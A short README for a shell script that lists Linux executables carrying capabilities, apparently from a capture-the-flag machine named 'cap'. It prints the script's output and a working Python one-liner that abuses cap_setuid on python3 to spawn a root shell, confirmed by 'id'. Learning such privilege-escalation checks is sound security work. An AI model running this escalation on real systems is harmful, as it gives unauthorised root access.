# cap
# Linux Privilege Escalation using Capabilities

script for searching PATH or parameters for any executables Capabilities applied to them.
This may lead to privelage esclastion.

for more read -> https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/

#Example
```
nathan@cap:~$ ./caps.sh 
find: ‘—’: No such file or directory
find: ‘/home/nathan/—’: No such file or directory
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
nathan@cap:~$ python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'                                                                                                                    
# id                                                                                                                                                                                        
uid=0(root) gid=1001(nathan) groups=1001(nathan)

```
